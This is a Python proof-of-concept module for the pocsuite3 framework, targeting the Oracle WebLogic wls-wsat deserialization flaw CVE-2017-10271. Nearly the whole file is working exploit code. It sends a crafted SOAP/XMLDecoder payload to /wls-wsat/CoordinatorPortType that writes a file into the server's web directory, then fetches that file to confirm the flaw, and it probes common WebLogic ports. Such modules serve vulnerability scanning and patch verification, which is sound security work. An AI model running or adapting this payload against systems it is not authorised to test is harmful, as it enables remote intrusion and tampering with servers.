#!/usr/bin/env python
# coding: utf-8
import random
import string
import time
from urllib.parse import urlparse
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'hancool'
    vulDate = '2017-10-23'
    createDate = '2017-12-22'
    updateDate = '2017-12-22'
    references = [
        'https://www.seebug.org/vuldb/ssvid-97009',
    ]
    name = 'Oracle WebLogic wls-wsat RCE(CVE-2017-10271)'
    appPowerLink = 'https://www.oracle.com/middleware/weblogic/index.html'
    appName = 'WebLogic'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
    Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。
Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。以下组版本受到影响：Oracle WebLogic Server 10.3.6.0.0版本，12.1.3.0.0版本，12.2.1.1.0版本，12.2.1.2.0版本。

    '''

    def _verify(self):
        flag = "".join(random.choice(string.ascii_letters)
                       for _ in range(0, 8))
        output_file = '{}.txt'.format(flag)
        '''
        payload的格式化
        '''
        def payload_command():
            command_filtered = "<string>{}</string>".format(flag)
            payload_1 = '''
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
            <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
            <java version="1.6.0" class="java.beans.XMLDecoder">
            <object class="java.io.PrintWriter">
            <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{}</string>
            <void method="println">{}</void><void method="close"/>
            </object>
            </java>
            </java>
            </work:WorkContext>
            </soapenv:Header><soapenv:Body/></soapenv:Envelope>'''.format(output_file, command_filtered)
            return payload_1

        '''
        检查结果
        '''
        def verify_result(target):
            headers = {
                'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
            # url增加时间戳避免数据是上一次的结果缓存
            output_url = '{}/bea_wls_internal/{}?{}'.format(
                target, output_file, int(time.time()))
            try:
                r = req.get(output_url, headers=headers)
                if r.status_code == req.codes.ok and flag in r.text:
                    return (True, 'success')
                elif r.status_code == 404:
                    return (False, '404 no output')
                else:
                    return (False, r.status_code)
            except req.exceptions.ReadTimeout:
                return (False, 'timeout')
            except Exception as ex:
                # raise
                return (False, str(ex))

        '''
        RCE POC
        '''
        def weblogic_rce(target):
            url = '{}/wls-wsat/CoordinatorPortType'.format(target)
            # content-type必须为text/xml
            payload_header = {'content-type': 'text/xml',
                              'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}
            try:
                r = req.post(url, payload_command(),
                             headers=payload_header, verify=False)
                # 500时说明已成功反序列化执行命令
                if r.status_code == 500:
                    return verify_result(target)
                elif r.status_code == 404:
                    return (False, '404 no vulnerability')
                else:
                    return (False, '{} something went wrong'.format(r.status_code))
            except req.exceptions.ReadTimeout:
                return (False, 'timeout')
            except Exception as ex:
                # raise
                return (False, str(ex))

        '''
        verify:
        '''
        result = {}
        pr = urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [7001, 17001, 27001]
        for port in ports:
            uri = "{0}://{1}:{2}".format(pr.scheme, pr.hostname, str(port))
            status, msg = weblogic_rce(uri)
            if status:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = uri
                break

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(TestPOC)
